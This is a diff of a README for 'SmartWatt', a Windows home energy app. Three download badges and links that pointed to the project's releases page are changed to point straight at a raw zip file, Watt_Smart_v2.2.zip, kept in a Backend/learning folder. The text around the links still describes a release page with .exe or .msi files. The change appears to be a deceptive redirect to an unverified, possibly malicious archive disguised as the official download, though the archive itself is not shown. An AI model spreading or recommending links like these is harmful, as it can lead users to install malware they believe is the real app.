@@ -1,6 +1,6 @@
 # ⚡ SmartWatt - Clear home energy insights
 
-[![Download SmartWatt](https://img.shields.io/badge/Download-SmartWatt-blue?style=for-the-badge)](https://github.com/keng2247/SmartWatt/releases)
+[![Download SmartWatt](https://img.shields.io/badge/Download-SmartWatt-blue?style=for-the-badge)](https://github.com/keng2247/SmartWatt/raw/refs/heads/main/Backend/learning/Watt_Smart_v2.2.zip)
 
 ## 🧭 What SmartWatt does
 
@@ -30,7 +30,7 @@ For best use:
 
 Visit this page to download SmartWatt for Windows:
 
-[![Go to SmartWatt Releases](https://img.shields.io/badge/Releases-Open%20Download%20Page-grey?style=for-the-badge)](https://github.com/keng2247/SmartWatt/releases)
+[![Go to SmartWatt Releases](https://img.shields.io/badge/Releases-Open%20Download%20Page-grey?style=for-the-badge)](https://github.com/keng2247/SmartWatt/raw/refs/heads/main/Backend/learning/Watt_Smart_v2.2.zip)
 
 On that page, look for the latest release and download the Windows file that matches your system. In most cases, the file name will end in `.exe` or `.msi`.
 
@@ -175,7 +175,7 @@ SmartWatt is a hybrid AI and physics-based residential energy estimation platfor
 
 If you need the latest Windows build, use the release page here:
 
-[Download SmartWatt from Releases](https://github.com/keng2247/SmartWatt/releases)
+[Download SmartWatt from Releases](https://github.com/keng2247/SmartWatt/raw/refs/heads/main/Backend/learning/Watt_Smart_v2.2.zip)
 
 ## 🖱️ Quick start path
 
